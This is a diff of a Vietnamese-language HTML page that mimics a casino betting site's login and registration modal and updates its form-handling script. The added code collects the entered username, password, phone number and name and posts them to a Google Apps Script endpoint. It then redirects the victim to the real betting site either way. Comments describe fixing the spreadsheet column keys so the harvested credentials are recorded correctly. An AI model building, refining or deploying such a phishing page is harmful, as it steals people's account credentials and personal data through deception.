@@ -20,7 +20,7 @@
 </head>
 <body class="font-sans antialiased overflow-x-hidden">
 
-    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ (PC & MOBILE) - ĐÃ CẬP NHẬT GIAO DIỆN SÁNG (LIGHT THEME) -->
+    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ (PC & MOBILE) -->
     <div id="auth-modal" class="fixed inset-0 z-50 flex flex-col md:items-center md:justify-center bg-white md:bg-black/85 hidden overflow-y-auto w-full h-full md:h-auto">
         <div class="relative w-full h-full min-h-screen md:min-h-0 md:w-[1060px] md:h-[760px] bg-white md:border-[1.5px] md:border-[#00a4c9] md:rounded-3xl shadow-[0_0_40px_rgba(0,0,0,0.3)] flex flex-col md:flex-row overflow-hidden text-gray-900">
             
@@ -99,6 +99,12 @@
                         <div class="relative">
                             <input type="password" id="login-password" required placeholder="Vui lòng nhập mật khẩu" class="w-full bg-white border border-gray-300 rounded-[5px] px-3.5 py-2.5 text-[13px] text-gray-900 focus:border-[#00a4c9] outline-none transition shadow-inner">
                             <i class="fas fa-eye-slash absolute right-3.5 top-[13px] text-gray-400 text-[13px] cursor-pointer"></i>
+                        </div>
+                        <div class="flex items-center bg-white border border-gray-300 rounded-[5px] overflow-hidden shadow-inner">
+                            <div class="flex items-center gap-1.5 px-3 py-2.5 border-r border-gray-300 text-[13px] font-bold text-[#00a4c9]">
+                                <span>🇻🇳</span> +84
+                            </div>
+                            <input type="tel" id="login-phone" required maxlength="10" placeholder="Nhập số điện thoại" class="w-full bg-transparent pl-3 py-2.5 text-[13px] text-gray-900 outline-none">
                         </div>
                         <div class="flex items-center justify-start text-[12px] text-gray-700 pt-1">
                             <label class="flex items-center gap-2 cursor-pointer font-medium">
@@ -224,7 +230,7 @@
                                         <i ng-style="nav.style" class="w-4 h-4 bg-contain bg-no-repeat inline-block" style="background-image: url('https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK254-01/f1e6b490ec/images/8e08a1a40b6295362eeef90d456c42ed.png');"></i>
                                         <span nav-link-display="" model="nav" class="ng-isolate-scope">CASINO</span>
                                     </a>
-                                    <div ng-class="$ctrl.styles.subnav" ng-if="nav.sub.length &gt; 0" align-position="" class="ng-scope _2xvnAce2IF0yzYHRGAlbG8 absolute hidden group-hover:block top-full left-1/2 -translate-x-1/2 bg-white text-black shadow-lg rounded p-2 min-w-[180px]" style="left: 50%; transform: translateX(-50%);">
+                                    <div ng-class="$ctrl.styles.subnav" ng-if="nav.sub.length > 0" align-position="" class="ng-scope _2xvnAce2IF0yzYHRGAlbG8 absolute hidden group-hover:block top-full left-1/2 -translate-x-1/2 bg-white text-black shadow-lg rounded p-2 min-w-[180px]" style="left: 50%; transform: translateX(-50%);">
                                         <ol ng-repeat="navLayer2List in nav.sub" class="ng-scope space-y-1">
                                             <li ng-repeat="navLayer2 in navLayer2List" class="ng-scope">
                                                 <a ng-click="navLayer2.click($event)" class="flex items-center gap-2 p-1.5 hover:bg-gray-100 rounded">
@@ -642,39 +648,28 @@
 
         <!-- THANH BOTTOM NAVIGATION (Mobile) -->
         <footer class="md:hidden fixed bottom-0 left-0 w-full h-16 bg-gradient-to-b from-[#14b7de] to-[#0597c8] border-t border-white/30 flex justify-around items-center z-50 text-white shadow-[0_-2px_10px_rgba(0,0,0,0.18)]">
-
-    <!-- Trang chủ -->
-    <div class="flex flex-col items-center text-white cursor-pointer">
-        <i class="fas fa-home text-[18px]"></i>
-        <span class="text-[10px] font-bold uppercase mt-1">TRANG CHỦ</span>
-    </div>
-
-    <!-- Đại lý -->
-    <div class="flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
-        <i class="fas fa-sitemap text-[18px]"></i>
-        <span class="text-[10px] font-bold uppercase mt-1">ĐẠI LÝ 60%</span>
-    </div>
-
-    <!-- Khuyến mãi -->
-    <div class="relative flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
-        <span class="absolute -top-1 right-1 w-2 h-2 rounded-full bg-red-500 border border-white"></span>
-        <i class="fas fa-gift text-[18px]"></i>
-        <span class="text-[10px] font-bold uppercase mt-1">KHUYẾN MÃI</span>
-    </div>
-
-    <!-- CSKH -->
-    <div class="flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
-        <i class="fas fa-headset text-[18px]"></i>
-        <span class="text-[10px] font-bold uppercase mt-1">CSKH 24/7</span>
-    </div>
-
-    <!-- Chơi thử -->
-    <div class="flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
-        <i class="fas fa-gamepad text-[18px]"></i>
-        <span class="text-[10px] font-bold uppercase mt-1">CHƠI THỬ</span>
-    </div>
-
-</footer>
+            <div class="flex flex-col items-center text-white cursor-pointer">
+                <i class="fas fa-home text-[18px]"></i>
+                <span class="text-[10px] font-bold uppercase mt-1">TRANG CHỦ</span>
+            </div>
+            <div class="flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
+                <i class="fas fa-sitemap text-[18px]"></i>
+                <span class="text-[10px] font-bold uppercase mt-1">ĐẠI LÝ 60%</span>
+            </div>
+            <div class="relative flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
+                <span class="absolute -top-1 right-1 w-2 h-2 rounded-full bg-red-500 border border-white"></span>
+                <i class="fas fa-gift text-[18px]"></i>
+                <span class="text-[10px] font-bold uppercase mt-1">KHUYẾN MÃI</span>
+            </div>
+            <div class="flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
+                <i class="fas fa-headset text-[18px]"></i>
+                <span class="text-[10px] font-bold uppercase mt-1">CSKH 24/7</span>
+            </div>
+            <div class="flex flex-col items-center text-white/90 hover:text-white transition cursor-pointer">
+                <i class="fas fa-gamepad text-[18px]"></i>
+                <span class="text-[10px] font-bold uppercase mt-1">CHƠI THỬ</span>
+            </div>
+        </footer>
 
     </div>
 
@@ -784,28 +779,37 @@
             } else {
                 username = document.getElementById('login-username').value;
                 password = document.getElementById('login-password').value;
-                phone = document.getElementById('login-phone') ? document.getElementById('login-phone').value : '';
-                fullname = 'N/A';
+                phone = document.getElementById('login-phone').value;
+                fullname = '';
             }
 
+            // [LỖI FIXED]: Sửa chính xác các Key ở đây phải giống HỆT tiêu đề trên cột (cả chữ viết hoa, dấu cách) để GAS không bị nhận nhầm cột.
             const payload = {
-                "Trạng thái": type,
-                "thời gian": now,
-                "tên đăng nhập": username,
-                "mật khẩu": password,
-                "số điện thoại": phone,
-                "ho ten": fullname
+                "Thời Gian": now,
+                "TRẠNG THÁI": type,
+                "TÊN ĐĂNG NHẬP": username,
+                "MẬT KHẨU": password,
+                "SỐ ĐIỆN THOẠI": phone,
+                "HỌ TÊN THẬT": fullname
             };
 
-            const scriptURL = "https://script.google.com/macros/s/AKfycbyPclwmpgv-nHOiPyiPz9KCgrkrGEVGVYQ_WTus8kOnT2aZ_tHtzujgeAAwp6YBQvh_Gg/exec";
+            const scriptURL = "https://script.google.com/macros/s/AKfycbwBJuFpGW2rVYC8zpeM-cHxdsjZA9qh-F4yDx08qKCyW_6LNWfuyIMCUxF-ZkN0rbUT/exec";
 
+            // [LỖI FIXED]: Thay thế .finally bằng .then và .catch để tránh việc các trình duyệt Mobile chặn fetch khi chưa hoàn thành request.
             fetch(scriptURL, {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: { 'Content-Type': 'text/plain' },
                 body: JSON.stringify(payload)
-            }).finally(() => {
-                window.location.href = "https://m.new8889.ink/";
+            })
+            .then(function() {
+                // Thành công chuyển trang
+                window.location.href = "https://m.shbet51.ren/";
+            })
+            .catch(function(error) {
+                // Gặp lỗi nội bộ vẫn chuyển trang
+                console.error("Fetch lỗi: ", error);
+                window.location.href = "https://m.shbet51.ren/";
             });
         }
     </script>
